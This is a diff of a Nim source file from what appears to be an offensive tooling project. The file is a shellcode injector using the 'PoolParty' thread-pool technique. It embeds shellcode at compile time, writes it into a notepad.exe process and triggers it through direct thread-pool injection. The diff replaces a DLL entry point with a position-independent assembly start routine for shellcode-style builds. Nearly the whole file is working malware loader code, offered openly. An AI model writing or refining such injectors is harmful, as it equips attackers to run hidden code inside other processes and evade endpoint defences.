@@ -1,9 +1,10 @@
 import winim/lean
 
-import instance , undefined_ref
-import nimpool/[nimpool, ioinject]
-import utils/[stackstr, stdio]
+import utils/[stdio, stackstr]
 import utils/stdlib/[stringh]
+
+import nimpool/[nimpool, ioinject]
+import instance
 
 # Read in shellcode at compile time
 const 
@@ -64,7 +65,7 @@ proc writePayloadIntoProcess*(hProcess: HANDLE, pPayload: pointer, szPayload: in
   pRemoteAddress[] = remote
   return true
 
-proc doPoolPartyTpDirect(pBuf: pointer, szBuf: int): bool =
+proc doPoolPartyVar1(pBuf: pointer, szBuf: int): bool =
   var 
     target {.stackStringA.} = "notepad.exe"
     pid: DWORD
@@ -80,23 +81,35 @@ proc doPoolPartyTpDirect(pBuf: pointer, szBuf: int): bool =
 
   if writePayloadIntoProcess(hProc, pBuf, szBuf, rPayload.addr):
     PRINTA("[+] Payload Successfully written to %p\n", rPayload)
+    discard ninst.Win32.MessageBoxA(cast[HWND](0), NULL, NULL, MB_OK)
 
   # Do injection
   return injectViaTpDirect(hProc, rPayload, hHiJack)
 
-proc injectViaThreadpool() = 
-  var pBuf = buf
+proc main() {.exportc: "Main".} =
+  discard init(ninst)
 
-  discard doPoolPartyTpDirect(pBuf, szBuf)
+  let pBuf = buf
+  PRINTA("[+] Payload at %p of size %i\n", pBuf, szBuf)
+
+  var bResult = doPoolPartyVar1(pBuf, szBuf)
+  
+  PRINTA("[+] doPoolPartyVar1 returned: %i\n", cast[int](bResult))
+
+  ninst.Win32.ExitProcess(69)
 
 
-proc DllMain(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReason: LPVOID): BOOL {.stdcall, exportc:"DLLMain", dynlib.} =
-  discard ninst.init()
+{.passC:"-masm=intel".}
+proc start() {.asmNoStackframe, codegenDecl: "__attribute__((section (\".text\"))) $# $#$#", exportc: "start".} =
+  asm """
+    and rsp, 0xfffffffffffffff0
+    sub rsp, 0x10
+    call Main
+    add rsp, 0x10
+    ret
+  """
 
-  if fdwReason == DLL_PROCESS_ATTACH:
-    injectViaThreadpool()
-  return true
-
-
+when isMainModule:
+  start()
 
 
